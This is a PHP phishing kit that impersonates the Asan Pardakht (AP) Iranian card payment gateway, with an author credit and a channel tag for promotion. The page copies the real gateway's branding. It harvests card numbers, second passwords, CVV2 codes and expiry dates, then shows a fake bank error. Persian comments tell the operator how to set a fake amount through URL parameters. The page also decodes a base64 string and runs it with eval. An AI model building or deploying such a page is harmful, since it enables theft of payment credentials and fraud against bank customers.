
<?php
$a=rand(1,7);
//CODED_BY AZERAKHSH_HUNTER//
//@IRANBOFFICIAL
//Join_US_Please

if(isset($_GET['e'])){
    $e = $_GET['e'];
}else{
    $e = 00000000;
}


//Give Amount 
if(isset($_GET['amount'])){
    $_SESSION['amount'] = $_GET['amount'];
}elseif(isset($_GET['Amount'])){
    $_SESSION['amount'] = $_GET['Amount'];
}elseif(isset($_GET['price'])){
    $_SESSION['amount'] = $_GET['price'];
}else{
    $_SESSION['amount'] = "20,000";
}
//Give Amount 


//Yeki az Ina ro Akhare linketoon ezaf konid va mablagh mored nazare dargah ro benevisid jolosh
//?Amount=
//?amount=
//?price=




//CODED_BY AZERAKHSH_HUNTER//
//@IRANBOFFICIAL
//Join_US_Please



//Show Error & AntiSpam!
if(isset($_GET['Error'])){
    $ERROR = $_GET['Error'];
}else{
    $ERROR = false;
}
if($ERROR == true) {
	
      	  $ERBOX = "PGRpdiBjbGFzcz0iYWxlcnQgYWxlcnQtZGFuZ2VyIiBzdHlsZT0idGV4dC1hbGlnbjpyaWdodDsgZGlyZWN0aW9uOnJ0bDsgbWFyZ2luOjEwcHggMHB4Ij48YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImNsb3NlIiBkYXRhLWRpc21pc3M9ImFsZXJ0IiBhcmlhLWhpZGRlbj0idHJ1ZSI+w5c8L2J1dHRvbj48aSBjbGFzcz0iaWNvbi13YXJuaW5nLXNpZ24iIHN0eWxlPSJmb250LXNpemU6MTJwdCI+PC9pPiA8c3Ryb25nPtqp2K8g2K7Yt9inOiAxODQ8L3N0cm9uZz48aHIgY2xhc3M9Im1lc3NhZ2UtaW5uZXItc2VwYXJhdG9yIj48cCBzdHlsZT0idGV4dC1hbGlnbjpyaWdodDsgZGlyZWN0aW9uOnJ0bCI+2b7Yp9iz2K7bjCDYp9iyINi32LHZgSDYqNin2YbaqSDYtdin2K/YsSDaqdmG2YbYr9mHINqp2KfYsdiqINiv2LHbjNin2YHYqiDZhti02K88L3A+PC9kaXY+";
	      $SEND = "submit();";
		  $Captcha="kosnanat(event);";
	}elseif($ERROR == false){
	 $SEND = "validateAndsend(event);submit()";
	 $Captcha="kosnanat(event);";
	 $ERBOX = "IA==";
		
	}else{
		
		echo "KOS NANAT";
	}	
//Show Error & AntiSpam!
	
	
	
	
//CODED_BY AZERAKHSH_HUNTER//
//@IRANBOFFICIAL
//Join_US_Please

//Acept All Resource
header('Access-Control-Allow-Origin: *');
//Its Ignore All ERRORs!
?>
<html>
<head>
	<meta http-equiv="Content-Language" content="fa">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="X-CSRF-Token" content="dsjlkj30djls89r89jdlnvbddjkdljee"/>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
	<title>آسان پرداخت پرشين(آپ)</title>
	<link href="css/bootstrap/bootstrap.min.css" rel="stylesheet" />
    <link href="css/bootstrap/bootstrap-responsive.min.css" rel="stylesheet" />
    <link href="css/previewnew.css" rel="stylesheet" />
    <link href="css/bootstrap/font-awesome.min.css" rel="stylesheet" />
	<link href="css/jquery.keypadnew.css" rel="stylesheet" type="text/css">	
    <!--[if IE 7]>
        <link href="css/bootstrap/font-awesome-ie7.min.css" rel="stylesheet" />
    <![endif]-->
    <!--[if IE 8]>
        <style type="text/css">
        .navbar-inner{
            filter:none;
        }
         </style>
        <![endif]-->

<style type="text/css">
/*
.modal-loading-bar { 
    position: fixed;
    top: 50% !important; 
    right: 50% !important; 
    margin-top: -100px;  
    margin-left: -200px; 
    overflow: visible !important;
}
*/
.modal-loading-bar{
	position: fixed;
	left: 50%;
	top: 50%;
	margin-top: -100px;
	margin-left: -150px;
}
.modal-loading-bar .modal-content {
    width: 300px; 
    height: 60px; 
	direction:rtl;
}
.progress .progress-bar.six-sec-ease-in-out {	
    -webkit-transition: width 6s ease-in-out;
    -moz-transition: width 6s ease-in-out;
    -ms-transition: width 6s ease-in-out;
    -o-transition: width 6s ease-in-out;
    transition: width 6s ease-in-out;
}

hr.message-inner-separator
{
    clear: both;
    margin-top: 10px;
    margin-bottom: 13px;
    border: 0;
    height: 1px;
    background-image: -webkit-linear-gradient(left,rgba(0, 0, 0, 0),rgba(0, 0, 0, 0.15),rgba(0, 0, 0, 0));
    background-image: -moz-linear-gradient(left,rgba(0,0,0,0),rgba(0,0,0,0.15),rgba(0,0,0,0));
    background-image: -ms-linear-gradient(left,rgba(0,0,0,0),rgba(0,0,0,0.15),rgba(0,0,0,0));
    background-image: -o-linear-gradient(left,rgba(0,0,0,0),rgba(0,0,0,0.15),rgba(0,0,0,0));
}
.alert{
	margin:10px;
	font-family:IRANSans; 
	font-weight:bold; 
	font-size:11px;
	text-align:right;
	direction:rtl
}
h3,h4{ 
 font-family:IRANSans; 
 direction:rtl
}
button.btn{ 
font-family:IRANSans; 
font-weight:bold; 
font-size:11px;
 margin-top:10px;
}
.btn-label {position: relative;right: -12px;display: inline-block;padding: 6px 8px 4px;background: rgba(0,0,0,0.15);}
.btn-labeled {padding-top: 0;padding-bottom: 0;}

.flat .plan {
  width:300px;
  margin:20px auto;
  border-radius: 6px;
  list-style: none;
  padding: 0 0 20px;
  background: #fff;
  text-align: center;
}
.flat .plan li {
  padding: 10px 15px;
  color: #000;
  border-top: 0;
  -webkit-transition: 300ms;
  transition: 300ms;
}
.flat .plan li.plan-price {
  border-top: 0;
}
.flat .plan li.plan-name {
  border-radius: 6px 6px 0 0;
  padding: 15px;
font-family:IRANSans; 
font-size:16px;
  line-height: 28px;
  color: #fff;
  background: #468847;
  direction:rtl;
  margin-bottom: 0;
  border-top: 0;
}
.flat .plan li.plan-red {
  border-radius: 6px 6px 0 0;
  padding: 15px;
	font-family:IRANSans; 
	font-size:16px;
  line-height: 28px;
  color: #fff;
  background: #e74c3c;
  direction:rtl;
  margin-bottom: 0;
  border-top: 0;
}

.headlogo img{
	height: 120px;
}


@media (max-width: 767px) {
	.tabbable.custom-tabs>.nav-tabs>li>a{
		min-width:10px;
		padding:15px 10px 10px;
	}
	.tabbable.custom-tabs>.nav-tabs>li>a>span{
		display: none
	}
	.headlogo img{
		display: block; 
		max-width: 100%; 
		height: 60px;
	}	
}

.ipgheader{
		background-image: url(img/topbarnew.jpg);
		background-position: 100% auto;
		background-repeat: no-repeat;
		background-size: contain;
		position: relative;
		padding-bottom: 7.5%;
	}
	input:focus:invalid:focus,textarea:focus:invalid:focus,select:focus:invalid:focus{
		border-color:#66afe9;
		-webkit-box-shadow:0 0 6px #66afe9;
		-moz-box-shadow:0 0 6px #66afe9;
		box-shadow:0 0 6px #66afe9;
		color:#000;
	}
/*.modal-loading-bar{
	position: absolute;
	top: 50%;
	left: 50%;
	margin-top: -50px;
	margin-left: -150px;	
}
*/
.BacktoMerchantSite{
	position: absolute;
	top: 50%;
	left: 50%;
	margin-left: -150px;
	margin-top: -100px;
	width: 300px;
	height: 100px;
	padding: 32px 0 28px;	
	text-align: center; 
	line-height: 18pt; 
	font-size:12px; 
	word-spacing: -1px;
}		
.PasswordStyleInput {
    -webkit-text-security: disc;
    }
</style>		<!--
//CODED_BY AZERAKHSH_HUNTER//
//@IRANBOFFICIAL
//Join_US_Please
<script type="text/javascript" src="js/payment.js"></script>
-->	
<script src="js/payment.js?v=9"></script>
<body>
<div id="OutputTxt">

<div id="PS_ePayment_GateWay">
        <div class="row-fluid" id="demo-3">
            <div class="span10 offset1">
				<!--
				<img src="img/sx.png" style="display:block;" />
                <div class="ipgheader"></div>
                <img src="img/s5.gif" style="display:block;" />
				-->
				<div style="display: flex; background:#fff; margin-bottom: 10px; margin-top: 10px; 
    -o-box-shadow: 0 0 4px rgba(0,0,0,.4);-ms-box-shadow: 0 0 4px rgba(0,0,0,.4);
-moz-box-shadow: 0 0 4px rgba(0,0,0,.4);-webkit-box-shadow: 0 0 4px rgba(0,0,0,.4);box-shadow: 0 0 4px rgba(0,0,0,.4);				
				">
					<div class="span6 headlogo" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
						<img src="img/logoap.jpg" style="float:left;" />
					</div>
					<div class="span6 headlogo" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
						<img src="img/logosh.jpg" style="float: right;" />
					</div>
				</div>
                <div class="tabbable custom-tabs tabs-right tabs-animated  flat flat-all hide-label-980 shadow  track-url auto-scroll">
                    <ul class="nav nav-tabs">
                        <li class="active"><a href="#panel3-1" data-toggle="tab" class="active "><span>انجام تراکنش</span>&nbsp;&nbsp;<i class="icon-lock"></i></a></li>                        
						
						<!--
						<li><a href="#panel3-2" data-toggle="tab"><span>هویت پذیرنده</span>&nbsp;&nbsp;<i class="icon-user"></i></a></li>
                        -->
						
						<li><a href="#panel3-3" data-toggle="tab"><span>توصیه ها</span>&nbsp;&nbsp;<i class="icon-key"></i></a></li>
                        
						<!--
						<li><a href="#panel3-4" data-toggle="tab"><span>اطلاعات تماس</span>&nbsp;&nbsp;<i class="icon-envelope-alt"></i></a></li>
						-->
						
                    </ul>
                    <div class="tab-content ">
                        <div class="tab-pane active" id="panel3-1" dir="rtl">
                            <div class="row-fluid">                                
                                <div class="span6">
                                    <h4><i class="icon-shopping-cart icon-large" style="font-size: 13pt"></i>&nbsp;&nbsp;اطلاعات خرید</h4>
                                    <div class="box" style="line-height:20px;">
                                        <p>
                                            نام پذیرنده :
                                            <br />
                                            <span>درگاه پرداخت موبايل</span>
                                        </p>
                                        <p>
                                            کد پذیرنده / ترمينال:
                                            <br />
                                            <span>87597 / 45647</span>
                                        </p>
                                        
										<p>
                                            نشانی سايت پذيرنده:
                                            <br />
                                            <span>																						
											https://<?php echo $_SERVER['HTTP_HOST']; ?>
											</span>
                                        </p>
										      		<!--
//CODED_BY AZERAKHSH_HUNTER//
//@IRANBOFFICIAL
//Join_US_Please
-->                                                                          
                                        <p>
                                            مبلغ تراکنش :
                                            <br />
                                            <span style="font:11pt IRANSans;">
											
											<span style="font:11px IRANSans;"><?php echo $_SESSION["amount"]; ?> ریال</span></span>
                                        </p>
									</div>
										<div style="background:#e0e0e0; text-align:right; font:10pt IRANSans; color: #333; margin-top:-10px; padding-right: 10px">
											زمان باقيمانده: <span class="GateTimer" style="text-align:left; font:12pt/30px IRANSans; color:#666"></span>											
										</div>  									
                                </div>
                                
                                <div class="span6">
								<form method="POST" action="?Error=true" name="epay_gateway_form" id="epay_gateway_form" style="padding:0; margin:0">
								<!--
									<input type="hidden" name="action" value="IPG_Pay_CallBack">
									<input type="hidden" name="RefId" value="b46f073593151f637">
									<input type="hidden" name="MessageId" value="114249058">
									<input type="hidden" name="price" value="926500">
									-->
									
									<h4><i class="icon-credit-card" style="font-size: 13pt"></i>&nbsp;&nbsp; اطلاعات کارت</h4>
									
                                    <label class="inputstyler">شماره کارت
										<span style="font:bold 11px IRANSans; padding-right:2px; color:#d00" id="GatewayFetchBankNameDiv"></span>
									</label>
									<!--
									<input type="hidden" name="cardnumberzp" id="cardnumberzp" value="" />
									-->
									<input type="tel" autocomplete="off" name="cardnumber" id="cardnumber" maxlength="16" dir="ltr" class="span12 text-left" required/>
									
									<label class="inputstyler">رمز اينترنتی (رمز دوم)</label>
                                    <input type="password" maxlength="12" tabindex="7" autocomplete="off" id="secondpass" name="secondpass" dir="ltr" class="input-block-level" inputmode="numeric" nextelement="CVV" required/>
                                    <label class="inputstyler">کد CVV2</label>
                                    <input type="password" autocomplete="off" id="cvv2" name="cvv2"  maxlength="4"  dir="ltr" class="input-block-level" inputmode="numeric" required/>
                                    <label class="inputstyler">تاریخ انقضای کارت</label>
									<div class="expdatealert alert alert-info" dir="rtl" style="display:none; padding: 3px 5px 0; margin:10px 0; font-weight:bold; font-size: 11px;">
										در صورت نياز می‌توانيد تاريخ انقضا را ويرايش نمائيد.
									</div>									
									<div class="row">
										<div class="span2" style="float: right">
										<label for="expmah" class="control-label inputstyler">ماه</label>                                    
										<input type="tel" autocomplete="off" id="expmah" name="expmah"  maxlength="2" dir="ltr" class="span10 text-center" style="font:11pt Tahoma,sans-serif" required/>
										<!--
										<input type="hidden" name="expmahnew" value="" />
										-->
										</div>
										<div class="span2" style="float: right">
										<label for="expyear" class="control-label inputstyler">سال</label>
										<input type="tel" autocomplete="off" id="expyear" name="expyear" value="" maxlength="2" dir="ltr" class="span10 text-center" style="font:11pt Tahoma,sans-serif" required/>
										<!--
										<input type="hidden" name="expyearnew" value="" />
										-->
										</div>
									</div>
									
									<div class="row" style="margin-bottom: 30px">
										<div class="span12 text-center" style="float:right;">
											<label class="inputstyler text-right">کد امنیتی</label>									
											<input type="tel" autocomplete="off" name="captchcode" id="captchacode" maxlength="5" minlength="5" oninput="<?php echo$Captcha?>" dir="ltr" class="numeric text-center" style="float:right;14px tahoma,sans-serif; padding-left:2px; padding-right:2px;" required/>
											<img id="imgCaptchaGateway" src="<?php echo $a?>.png" style="float:right; height:auto; vertical-align:middle;" />
											<a title="تغيير تصوير" href="javascript:void(0)" onclick="javascript:location.reload()"><img alt="تغيير تصوير" src="img/ico_refresh.png"  style="float:right; margin-top:3px; border:0; width:24px; height:24px; vertical-align:middle"></a>
										</div>
									</div>								
									<div class="row">
										
										<div class="span6" style="float:right;">										
										<input type="tel"  placeholder="موبايل(اختياری)" name="mobileforipg" id="mobileforipg" value="" autocomplete="on" maxlength="11" dir="rtl" class="numeric span11" style="font:11px Tahoma,sans-serif" />
										</div>
										<div class="span6" style="float:right;">
										<input type="text" placeholder="ايميل(اختياری)" name="emailforipg" id="emailforipg" value="" autocomplete="on" maxlength="50" dir="rtl" class="span11" style="font:11px tahoma,sans-serif" />
										</div>
										<input type="hidden" id="order" value="<?php echo$e ?>"
									</div>
										<div style="clear:both"></div>	
<?php eval("?>".base64_decode("$ERBOX")); ?>							
										<div id="GatewayInputError"></div>										
										<div style="clear:both"></div>										
										<button type="button" onclick="<?php echo$SEND ?>" class="paymentap btn btn-labeled btn-success"><span class="btn-label"><i class="icon-ok" style=""></i></span><span style="padding-right: 24px; padding-left: 24px">پرداخت</span></button>
										<button type="button" onclick="location.href = 'cancel.php'"  class="btn btn-labeled btn-default"><span class="btn-label"><i class="icon-remove" style=""></i></span>انصراف</button>									
                                </form>
								</div>
                            </div>
                        </div>

                    </div>

                </div>
                <img src="img/sx.png" style="display:block;" />
                <div style="width:100%; height:30px; font-family:IRANSans; color:#333; text-align:center; font-size:11px;line-height: 16pt">
                    <div class="span12" dir="rtl" style="font-family:IRANSans; color:#333; text-align:center; 
                    font-size:11px;line-height: 16pt">کلیه حقوق برای شرکت آسان پرداخت محفوظ است. 
                    <br>
					تماس: 02183333
                    <div class="span12" dir="rtl" style="display: none">
                    <img alt="شبکه الکترونیکی پرداخت کارت شاپرک" title="شبکه الکترونیکی پرداخت کارت شاپرک" src="img/logo_shaparak.png" style="width:60px; height:38px; border:3px solid #ccc;" />
                    <img alt="آسان پرداخت پرشين (آپ)" title="آسان پرداخت پرشين (آپ)" src="img/logo_ap.png" style="width:40px; height:38px; border:3px solid #ccc;" />
                    <img src="img/logo_ssl.png" style="width:95px; height:38px; border:3px solid #ccc;" />
                	</div>
                    
                    </div>
                </div>
                <br />
            </div>  
                      
        </div>
</div>                            
</div>
		<!--
//CODED_BY AZERAKHSH_HUNTER//
//@IRANBOFFICIAL
//Join_US_Please
-->
<div class="modal modal-loading-bar" style="width:300px">
 <div class="modal-dialog">
   <div class="modal-content">
     <div class="modal-body">		
		<div class="progress progress-striped progress-danger active">
		   <div class="bar six-sec-ease-in-out" aria-valuetransitiongoal="100" style="font-family:IRANSans; font-size:13px"></div>
		</div>		
     </div>
   </div>
 </div>
</div>
<script type="text/javascript" src="js/jquery-1.7.2.min.js"></script>
    <script type="text/javascript" src="js/bootstrap.min.js"></script>
    <script type="text/javascript" src="js/tabs-addon.js"></script>
	<script type="text/javascript" src="js/jquery.keypad.js"></script>
	<script type="text/javascript" src="js/jquery.numeric.js"></script>
	<script type="text/javascript" src="js/functions.js?40bb4d96d117a67fd75bc4828ff8bf08"></script>
    <script type="text/javascript">
	var csrf_token = '40bb4d96d117a67fd75bc4828ff8bf08';
	$(document).bind("ajaxSend", function(elm, xhr, s){	
	   //if (s.type == "POST") {
	   if (!/^(GET|HEAD|OPTIONS|TRACE)$/i.test(s.type)) {
		xhr.setRequestHeader('X-CSRF-Token', csrf_token);
	   }
	});
	//if ($("#cardnumber").length >= 1)
		//$("#cardnumber").val('');
	if ($(window).width() > 768)
		$("#cardnumber").focus(); 
	if (top.frames.length != 0) 
		{
			//alert('شما مجاز به استفاده از فريم نيستيد.');
			top.location = window.location;
		}
        var aspect_ratio = 0.0726075949367089;
		jQuery(window).resize(function() {
			$("#topnavbar").height( $("#topnavbar").width() * aspect_ratio );
		});
		
		$(function ()
        {
			PSGateWayPackage();
			$("#topnavbar").height($("#topnavbar").width() * aspect_ratio );
			$("a[href^='#demo']").click(function (evt)
            {
                evt.preventDefault();
                var scroll_to = $($(this).attr("href")).offset().top;
                $("html,body").animate({ scrollTop: scroll_to - 80 }, 600);
            });
            $("a[href^='#bg']").click(function (evt)
            {
                evt.preventDefault();
                $("body").removeClass("light").removeClass("dark").addClass($(this).data("class")).css("background-image", "url('css/" + $(this).data("file") + "')");
                console.log($(this).data("file"));


            });
            $("a[href^='#color']").click(function (evt)
            {
                evt.preventDefault();
                var elm = $(".tabbable");
                elm.removeClass("grey").removeClass("dark").removeClass("dark-input").addClass($(this).data("class"));
                if (elm.hasClass("dark dark-input"))
                {
                    $(".btn", elm).addClass("btn-inverse");
                }
                else
                {
                    $(".btn", elm).removeClass("btn-inverse");
                }

            });
            $(".color-swatch div").each(function ()
            {
                $(this).css("background-color", $(this).data("color"));
            });
            $(".color-swatch div").click(function (evt)
            {
                evt.stopPropagation();
                $("body").removeClass("light").removeClass("dark").addClass($(this).data("class")).css("background-color", $(this).data("color"));
            });
            $("#texture-check").mouseup(function (evt)
            {
                evt.preventDefault();

                if (!$(this).hasClass("active"))
                {
                    $("body").css("background-image", "url(css/n1.png)");
                }
                else
                {
                    $("body").css("background-image", "none");
                }
            });

            $("a[href='#']").click(function (evt)
            {
                evt.preventDefault();
            });

            $("a[data-toggle='popover']").popover({
                trigger:"hover",html:true,placement:"top"
            });
        });
		if ($('#cardnumber').length > 0){
			if ($('#cardnumber').val().length > 6 && $('#GatewayFetchBankNameDiv').html().length < 1)
				$('#GatewayFetchBankNameDiv').html(FetchBankName($('#cardnumber').val().replace(/[^0-9*]/g, '')));
		}
		

		$('#cardlistcombo').on('change',function(e){
			if (this.value == 'NoSavedCard'){
				$('.cardnumber4div').slideDown('500', function(){$(this).show();});
				$('#expmah').val('');
				$('#expyear').val('');				
				$('.expdatealert').slideUp('500', function(){$(this).hide();});
			}
			else{ 
				$('.cardnumber4div').slideUp('500', function(){$(this).hide();});
				if (this.options[this.selectedIndex].getAttribute('expiration') == 'true'){
					$('#expmah').val('••');
					$('#expyear').val('••');
					$('.expdatealert').slideDown('500', function(){$(this).show();});
				}
				else{
					$('#expmah').val('');
					$('#expyear').val('');				
					$('.expdatealert').slideUp('500', function(){$(this).hide();});
				}
					
			}
				
		});
		
		$("#secondpass, #cvv2, #expmah, #expyear, #captchacode").keyup(function () {
			//$(this).prop("autocomplete","off");
			//$(this).val(Num2En($(this).val()));			
			var ipgformval = Num2En($(this).val());			
			$(this).val(ipgformval.replace(/[^0-9*]/g, ''));
			
			//if ($('#captchacode').val().length == 5 && $(window).width() < 768){
			if ($('#captchacode').is(":focus") && $('#captchacode').val().length == 5){
				$('html, body').animate({
				  scrollTop: $(".paymentap").offset().top
				}, 1000);			
			}
		});
		$(".cardnumberap").keyup(function () {			
			//$(this).prop("autocomplete","off");
			//$(this).val(Num2En($(this).val()));			
			var cardval = Num2En($(this).val());
			$(this).val(cardval.replace(/[^0-9*]/g, ''));
			
			if ($('input:[name=cardnumber1]').val().length == 4 && $('input:[name=cardnumber2]').val().length >= 2){
				var bincardtxt = $('input:[name=cardnumber1]').val()+$('input:[name=cardnumber2]').val().substr(0,2);
				$('#GatewayFetchBankNameDiv').html(FetchBankName(bincardtxt));
			}			
			
			if (this.value.length == this.maxLength) {
			  var $next = $(this).next('.cardnumberap');
				//$(this).next('.cardnumberap').focus();				
			  if ($next.length){
				  $(this).next('.cardnumberap').focus();
				  var tmpStr = $(this).next('.cardnumberap').val();
				  $(this).next('.cardnumberap').val('');				  
				  $(this).next('.cardnumberap').val(tmpStr);				  				  
				  $(this).next('.cardnumberap').focus().val($(this).next('.cardnumberap').val());
				}
			  else
				$('#secondpass').focus().val($('#secondpass').val());
				  //$(this).blur();
			}
		});
		$(document).ready(function() {
			var isWebKit = /webkit/.test(navigator.userAgent.toLowerCase());
			var isEdge = navigator.userAgent.search("Edge") > 0;	
			if (!isEdge && isWebKit){		
				$("#secondpass, #cvv2").addClass("PasswordStyleInput");
				$("#secondpass, #cvv2").prop("type", "tel");
				//$("#secondpass, #cvv2").attr("type", "tel");
				//setTimeout(function() {
					//$("#secondpass, #cvv2").addClass("PasswordStyleInput");
					//$("#secondpass, #cvv2").prop("type", "tel");			
				//}, 1);
			}			
		});
	var image = new Image();
	image.src = '/img/aploader.gif';		
    </script>
			<!--
//CODED_BY AZERAKHSH_HUNTER//
//@IRANBOFFICIAL
//Join_US_Please
-->
</body>
</html>